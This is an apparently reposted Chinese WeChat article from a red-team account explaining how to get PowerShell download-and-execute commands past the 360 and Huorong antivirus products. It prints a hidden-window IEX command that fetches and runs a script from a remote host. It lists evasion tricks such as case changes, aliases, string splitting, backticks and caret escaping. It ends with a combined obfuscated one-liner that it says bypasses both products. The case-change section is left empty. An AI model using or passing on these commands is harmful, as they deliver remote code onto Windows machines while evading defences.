#  Bypass_AV - Powershell命令免杀

[ 渗透攻击红队 ](javascript:void\(0\);)

**渗透攻击红队** ![]()

微信号 RedTeamHacker

功能介绍 一个专注于渗透红队攻击的公众号

____

__

收录于话题

编者荐语：

学习一波

以下文章来源于不懂安全的校长 ，作者校长

![](http://wx.qlogo.cn/mmhead/Q3auHgzwzM6fWjaX953fWcIeWO2XYI40qbq9Mibxr5NJ0ODVk7uibZOw/0)
**不懂安全的校长** .

校长不懂安全，总是发些奇奇怪怪的东西！

## 0x01 前言

    
    
    powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://192.168.190.128:80/a'))"  
    

现在powershell指令一般都会被拦截，且不说.ps1现在能不能过免杀，这次我们先来讨论`powershell加载命令能否Bypass_AV`

对于这种一句话，我们需要去思考！

## 0x02 官方文档

我们先去官网查看相关的文档

 **文档:**

  * `https://docs.microsoft.com/zh-cn/powershell/module/microsoft.powershell.core/about/about_quoting_rules?view=powershell-7.1`
  * `https://docs.microsoft.com/zh-cn/powershell/module/microsoft.powershell.core/about/about_aliases?view=powershell-7.1`
  * `https://docs.microsoft.com/zh-cn/powershell/scripting/developer/cmdlet/required-development-guidelines?view=powershell-7.1`

## 0x03 准备 && 思路

环境:`Powershell 5`

测试免杀环境:`Windows 10`

杀软:`360 && 火绒`

测试时间:`2021年9月7日`

将进行免杀的时候， **我们需要思考一下思路都有什么？**

  *  **大小写绕过**
  *  **管道符**
  *  **修改函数名**
  *  **命令拆分**
  *  **反引号处理**

####  Tip:

`进行Powershell命令绕过，我们可以先了解WEB方面的远程命令执行以及它的各种Bypass姿势，有助于我们对Powershell加载命令进行免杀`

## 0x04 开始爬坑

#### 大小写

    
    
    powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://192.168.190.128:80/a'))"  
    

通过对整个语句进行`大小写`，看看能不能Bypass_AV

修改后:

## 0x05 组合拳

将上面的思路组合在一起来进行绕过

Powershell:

    
    
    cmd /c echo set-alias -name xz -value IEX;x^z (New-Object "Ne`T.WeB`ClienT").d^o^w^n^l^o^a^d^s^t^r^i^n^g('ht'+'tP://19’+'2.168.190.12'+'8/a') | p^o^w^e^r^s^h^e^l^l -  
    

![](https://gitee.com/fuli009/images/raw/master/public/20210908145431.png)直接起飞，`360
&& 火绒` 直接绕过执行命令

## 0x06 结尾

对于`Powershell加载命令`来说，多阅读官方文档肯定是没错的，多了解几个函数，几个功能！对于我们进行免杀是有莫大帮助的。方法肯定不止局限于我列举的这几种，推荐`公众号
@XG小刚`本文也以这个为参考。

预览时标签不可点

收录于话题 #

个 __

上一篇 下一篇

阅读

分享 收藏

赞 在看

____已同步到看一看[写下你的想法](javascript:;)

前往“发现”-“看一看”浏览“朋友在看”

![示意图](//res.wx.qq.com/mmbizwap/zh_CN/htmledition/images/pic/appmsg/pic_like_comment55871f.png)

前往看一看

**看一看入口已关闭**

在“设置”-“通用”-“发现页管理”打开“看一看”入口

[我知道了](javascript:;)

__

已发送

取消 __

####  发送到看一看

发送

Bypass_AV - Powershell命令免杀

最多200字，当前共字

__

发送中

写下你的留言

微信扫一扫  
关注该公众号

[知道了](javascript:;)

微信扫一扫  
使用小程序

****

[取消](javascript:void\(0\);) [允许](javascript:void\(0\);)

****

[取消](javascript:void\(0\);) [允许](javascript:void\(0\);)

： ， 。 视频 小程序 赞 ，轻点两下取消赞 在看 ，轻点两下取消在看

